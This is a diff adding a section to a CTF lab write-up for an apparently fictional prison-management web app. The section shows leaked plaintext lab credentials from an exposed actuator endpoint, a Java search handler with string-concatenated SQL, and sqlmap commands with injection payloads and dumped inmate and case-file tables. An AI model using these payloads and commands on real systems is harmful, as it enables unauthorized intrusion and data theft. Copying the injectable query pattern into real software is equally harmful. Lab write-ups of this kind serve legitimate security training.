@@ -163,3 +163,187 @@ by Ben "epi" Risher 🤓                 ver: 2.13.1
 ## More Recon and Information Gathering
 
 > During the assessment of the vulnerable website, I came accross this /actuator endpoint, where the directory contents were fully exposed. I found /actuator/env, and started reading the contents. Then I found another exposed credential `kiosk:Sh1ftK10sk#2091` the username and password fully in plaintext. Then, from the source code, I found two other leaked credentials; 1. `ironhold_lookup:Lk_r0_2091!` and 2. `j.reyes,m.chen,a.osei,l.bianchi:IronholdStaff2026!` (4 staff members assigned same password) Let's note these. For source code, and how we found these, look [here](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/SourceCode/README.md)
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/Images/Screenshot%20From%202026-07-29%2016-18-00.png)
+
+> Kiosk Credentials found in `/actuator` endpoint. This endpoint literally leaks its contents unauthenticated. I found the `/env` file with secrets, and system variables. 
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/Images/Screenshot%20From%202026-07-29%2020-39-12.png)
+
+> Login page:
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/Images/Screenshot%20From%202026-07-29%2016-46-16.png)
+
+
+> Let's login with `kiosk` user:
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/Images/Screenshot%20From%202026-07-29%2023-23-16.png)
+
+> After some XSS cookie theft and SSTI attempts, I found this search bar where you can search for inmates. From the source code I found out that this endpoint doesn't sanitize query, which is vulnerable to SQL Injection.
+
+```java
+@GetMapping("/inmates/search")
+    public String search(@RequestParam(required = false) String q, Model model) {
+        List<Map<String, Object>> results;
+        if (q == null || q.isBlank()) {
+            results = jdbcTemplate.queryForList("SELECT id, name, block FROM inmates");
+        } else {
+            String sql = "SELECT id, name, block FROM inmates WHERE name = '" + q + "'"; 
+            results = jdbcTemplate.queryForList(sql);
+        }
+        model.addAttribute("results", results);
+        model.addAttribute("query", q == null ? "" : q);
+        return "inmate-search";
+    }
+```
+
+> Let's try sqlmap to dump tables for this one:
+
+```bash
+sqlmap -u "http://iron.thm:8080/inmates/search?q=test" \
+  --dbs \
+  --batch --cookie='JSESSIONID=4DE65F6695C9A941B66F94B91F610BA4' --level 5 
+        ___
+       __H__                                                                                                                                                       
+ ___ ___["]_____ ___ ___  {1.10.5#stable}                                                                                                                          
+|_ -| . [.]     | .'| . |                                                                                                                                          
+|___|_  [(]_|_|_|__,|  _|                                                                                                                                          
+      |_|V...       |_|   https://sqlmap.org                                                                                                                       
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:21:11 /2026-07-29/
+Parameter: q (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: q=test' AND 4972=(SELECT (CASE WHEN (4972=4972) THEN 4972 ELSE (SELECT 7264 UNION SELECT 8098) END))-- XneF
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: q=test' UNION ALL SELECT NULL,CHAR(113)||CHAR(122)||CHAR(98)||CHAR(112)||CHAR(113)||CHAR(84)||CHAR(84)||CHAR(102)||CHAR(99)||CHAR(68)||CHAR(98)||CHAR(117)||CHAR(119)||CHAR(112)||CHAR(105)||CHAR(81)||CHAR(71)||CHAR(78)||CHAR(72)||CHAR(99)||CHAR(98)||CHAR(106)||CHAR(72)||CHAR(82)||CHAR(112)||CHAR(67)||CHAR(114)||CHAR(116)||CHAR(108)||CHAR(67)||CHAR(77)||CHAR(81)||CHAR(109)||CHAR(88)||CHAR(78)||CHAR(71)||CHAR(88)||CHAR(99)||CHAR(77)||CHAR(104)||CHAR(101)||CHAR(68)||CHAR(70)||CHAR(85)||CHAR(67)||CHAR(113)||CHAR(118)||CHAR(118)||CHAR(106)||CHAR(113),NULL-- GWPO
+---
+[15:21:26] [INFO] testing H2
+[15:21:26] [INFO] confirming H2
+[15:21:26] [INFO] the back-end DBMS is H2
+back-end DBMS: H2
+[15:21:27] [INFO] fetching database names
+available databases [2]:
+[*] INFORMATION_SCHEMA
+[*] PUBLIC
+
+[15:21:27] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 53 times
+
+```
+
+> We found 2 databases - public, and information_schema. Let's extract tables, and dump them.
+
+```bash
+sqlmap -u "http://iron.thm:8080/inmates/search?q=test" \
+  -D PUBLIC \
+  --batch --cookie='JSESSIONID=4DE65F6695C9A941B66F94B91F610BA4' --level 5 --tables --dump
+        ___
+       __H__                                                                                                                                                       
+ ___ ___[,]_____ ___ ___  {1.10.5#stable}                                                                                                                          
+|_ -| . ["]     | .'| . |                                                                                                                                          
+|___|_  [']_|_|_|__,|  _|                                                                                                                                          
+      |_|V...       |_|   https://sqlmap.org                                                                                                                       
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:52:54 /2026-07-29/
+
+[15:52:54] [INFO] resuming back-end DBMS 'h2' 
+[15:52:54] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: q=test' AND 4972=(SELECT (CASE WHEN (4972=4972) THEN 4972 ELSE (SELECT 7264 UNION SELECT 8098) END))-- XneF
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: q=test' UNION ALL SELECT NULL,CHAR(113)||CHAR(122)||CHAR(98)||CHAR(112)||CHAR(113)||CHAR(84)||CHAR(84)||CHAR(102)||CHAR(99)||CHAR(68)||CHAR(98)||CHAR(117)||CHAR(119)||CHAR(112)||CHAR(105)||CHAR(81)||CHAR(71)||CHAR(78)||CHAR(72)||CHAR(99)||CHAR(98)||CHAR(106)||CHAR(72)||CHAR(82)||CHAR(112)||CHAR(67)||CHAR(114)||CHAR(116)||CHAR(108)||CHAR(67)||CHAR(77)||CHAR(81)||CHAR(109)||CHAR(88)||CHAR(78)||CHAR(71)||CHAR(88)||CHAR(99)||CHAR(77)||CHAR(104)||CHAR(101)||CHAR(68)||CHAR(70)||CHAR(85)||CHAR(67)||CHAR(113)||CHAR(118)||CHAR(118)||CHAR(106)||CHAR(113),NULL-- GWPO
+---
+[15:52:54] [INFO] the back-end DBMS is H2
+back-end DBMS: H2
+[15:52:54] [INFO] fetching tables for database: 'PUBLIC'
+Database: PUBLIC
+[10 tables]
++-------------------+
+| ADMIN_NOTICES     |
+| CASE_FILES        |
+| COMMISSARY_ORDERS |
+| INCIDENT_REPORTS  |
+| INMATES           |
+| MESSAGES          |
+| MOVEMENTS         |
+| NOTICES           |
+| STAFF             |
+| VISITATIONS       |
++-------------------+
+
+[15:52:54] [INFO] fetching columns for table 'ADMIN_NOTICES' in database 'PUBLIC'
+[15:52:55] [WARNING] reflective value(s) found and filtering out
+[15:52:55] [INFO] fetching entries for table 'ADMIN_NOTICES' in database 'PUBLIC'
+[15:52:55] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
+[15:52:55] [WARNING] the SQL query provided does not return any output
+[15:52:55] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[15:52:55] [INFO] fetching number of entries for table 'ADMIN_NOTICES' in database 'PUBLIC'
+[15:52:55] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[15:52:55] [INFO] retrieved: 
+[15:52:55] [WARNING] unable to retrieve the number of entries for table 'ADMIN_NOTICES' in database 'PUBLIC'
+[15:52:55] [INFO] fetching columns for table 'MOVEMENTS' in database 'PUBLIC'
+[15:52:56] [INFO] fetching entries for table 'MOVEMENTS' in database 'PUBLIC'
+[15:52:56] [WARNING] the SQL query provided does not return any output
+[15:52:56] [INFO] fetching number of entries for table 'MOVEMENTS' in database 'PUBLIC'
+[15:52:56] [INFO] retrieved: 
+[15:52:56] [WARNING] unable to retrieve the number of entries for table 'MOVEMENTS' in database 'PUBLIC'
+[15:52:56] [INFO] fetching columns for table 'INMATES' in database 'PUBLIC'
+[15:52:56] [INFO] fetching entries for table 'INMATES' in database 'PUBLIC'
+Database: PUBLIC
+Table: INMATES
+[20 entries]
++----+-------------------+---------+------------------+-------------+-------------+----------------+
+| ID | NAME              | BLOCK   | OFFENSE          | STATUS      | CELL_NUMBER | ADMISSION_DATE |
++----+-------------------+---------+------------------+-------------+-------------+----------------+
+| 1  | James Marsh       | A-Wing  | Burglary         | ACTIVE      | 100         | 2022-01-01     |
+| 2  | Robert Alvarez    | B-Wing  | Fraud            | ACTIVE      | 103         | 2023-02-02     |
+| 3  | Michael Nakamura  | C-Wing  | Grand Theft Auto | ACTIVE      | 106         | 2024-03-03     |
+| 4  | David Brennan     | D-Wing  | Racketeering     | SEGREGATION | 109         | 2025-04-04     |
+| 5  | Marcus Solano     | A-Wing  | Forgery          | TRANSFERRED | 112         | 2022-05-05     |
+| 6  | Elena Castillo    | B-Wing  | Extortion        | ACTIVE      | 115         | 2023-06-06     |
+| 7  | Sofia Reilly      | C-Wing  | Arson            | ACTIVE      | 118         | 2024-07-07     |
+| 8  | Grace Okafor      | D-Wing  | Assault          | ACTIVE      | 121         | 2025-08-08     |
+| 9  | Daniel Winslow    | A-Wing  | Burglary         | SEGREGATION | 124         | 2022-09-09     |
+| 10 | Victor Fitzgerald | B-Wing  | Fraud            | TRANSFERRED | 127         | 2023-10-10     |
+| 11 | Nadia Delgado     | C-Wing  | Grand Theft Auto | ACTIVE      | 130         | 2024-11-11     |
+| 12 | Omar Abara        | D-Wing  | Racketeering     | ACTIVE      | 133         | 2025-12-12     |
+| 13 | Isabel Whitfield  | A-Wing  | Forgery          | ACTIVE      | 136         | 2022-01-13     |
+| 14 | Lucas Doyle       | B-Wing  | Extortion        | SEGREGATION | 139         | 2023-02-14     |
+| 15 | Theo Petrov       | C-Wing  | Arson            | TRANSFERRED | 142         | 2024-03-15     |
+| 16 | Priya Kowalski    | D-Wing  | Assault          | ACTIVE      | 145         | 2025-04-16     |
+| 17 | Hassan Novak      | A-Wing  | Burglary         | ACTIVE      | 148         | 2022-05-17     |
+| 18 | Ines Hartley      | B-Wing  | Fraud            | ACTIVE      | 151         | 2023-06-18     |
+| 19 | Kenji Vance       | C-Wing  | Grand Theft Auto | SEGREGATION | 154         | 2024-07-19     |
+| 20 | Ruth Duarte       | D-Wing  | Racketeering     | TRANSFERRED | 157         | 2025-08-20     |
++----+-------------------+---------+------------------+-------------+-------------+----------------+
+
+[15:52:57] [INFO] table 'PUBLIC.INMATES' dumped to CSV file '/root/.local/share/sqlmap/output/iron.thm/dump/PUBLIC/INMATES.csv'
+[15:52:57] [INFO] fetching columns for table 'NOTICES' in database 'PUBLIC'
+[15:52:57] [INFO] fetching entries for table 'NOTICES' in database 'PUBLIC'
+[15:52:57] [WARNING] the SQL query provided does not return any output
+[15:52:57] [INFO] fetching number of entries for table 'NOTICES' in database 'PUBLIC'
+[15:52:57] [INFO] retrieved: 
+[15:52:57] [WARNING] unable to retrieve the number of entries for table 'NOTICES' in database 'PUBLIC'
+[15:52:57] [INFO] fetching columns for table 'CASE_FILES' in database 'PUBLIC'
+[15:52:57] [INFO] fetching entries for table 'CASE_FILES' in database 'PUBLIC'
+Database: PUBLIC
+Table: CASE_FILES
+[1 entry]
++----+-------------------------+---------------------------------+----------+----------------------------+-------------+
+| ID | TITLE                   | SUMMARY                         | STATUS   | OPENED_AT                  | CASE_NUMBER |
++----+-------------------------+---------------------------------+----------+----------------------------+-------------+
+| 1  | Internal Affairs Review | THM{redacted} | OPEN     | 2026-04-29 19:07:15.809349 | IA-2024-007 |
++----+-------------------------+---------------------------------+----------+----------------------------+-------------+
+```
